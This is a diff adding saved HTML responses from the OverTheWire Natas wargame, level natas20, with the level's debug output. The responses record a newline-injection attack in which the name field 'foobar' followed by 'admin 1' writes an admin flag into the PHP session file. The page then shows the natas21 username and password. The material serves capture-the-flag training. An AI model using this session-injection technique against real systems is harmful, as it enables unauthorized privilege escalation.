@@ -1,0 +1,76 @@
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas20", "pass": "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" };</script></head>
+<body>
+<h1>natas20</h1>
+<div id="content">
+DEBUG: MYREAD 0m1grlqg09t4utp7t92rirl903<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to foobar<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+<form action="index.php" method="POST">
+Your name: <input name="name" value="foobar"><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+DEBUG: MYWRITE 0m1grlqg09t4utp7t92rirl903 name|s:6:"foobar";<br>DEBUG: Saving in /var/lib/php5/sessions//mysess_0m1grlqg09t4utp7t92rirl903<br>DEBUG: name => foobar<br><html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas20", "pass": "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" };</script></head>
+<body>
+<h1>natas20</h1>
+<div id="content">
+DEBUG: MYREAD 0m1grlqg09t4utp7t92rirl903<br>DEBUG: Reading from /var/lib/php5/sessions//mysess_0m1grlqg09t4utp7t92rirl903<br>DEBUG: Read [name foobar]<br>DEBUG: Read []<br>DEBUG: Name set to foobar
+admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+<form action="index.php" method="POST">
+Your name: <input name="name" value="foobar
+admin 1"><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+DEBUG: MYWRITE 0m1grlqg09t4utp7t92rirl903 name|s:15:"foobar
+admin 1";<br>DEBUG: Saving in /var/lib/php5/sessions//mysess_0m1grlqg09t4utp7t92rirl903<br>DEBUG: name => foobar
+admin 1<br><html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas20", "pass": "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" };</script></head>
+<body>
+<h1>natas20</h1>
+<div id="content">
+DEBUG: MYREAD 0m1grlqg09t4utp7t92rirl903<br>DEBUG: Reading from /var/lib/php5/sessions//mysess_0m1grlqg09t4utp7t92rirl903<br>DEBUG: Read [name foobar]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to foobar
+admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
+<form action="index.php" method="POST">
+Your name: <input name="name" value="foobar
+admin 1"><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+DEBUG: MYWRITE 0m1grlqg09t4utp7t92rirl903 name|s:15:"foobar
+admin 1";admin|s:1:"1";<br>DEBUG: Saving in /var/lib/php5/sessions//mysess_0m1grlqg09t4utp7t92rirl903<br>DEBUG: admin => 1<br>DEBUG: name => foobar
+admin 1<br>
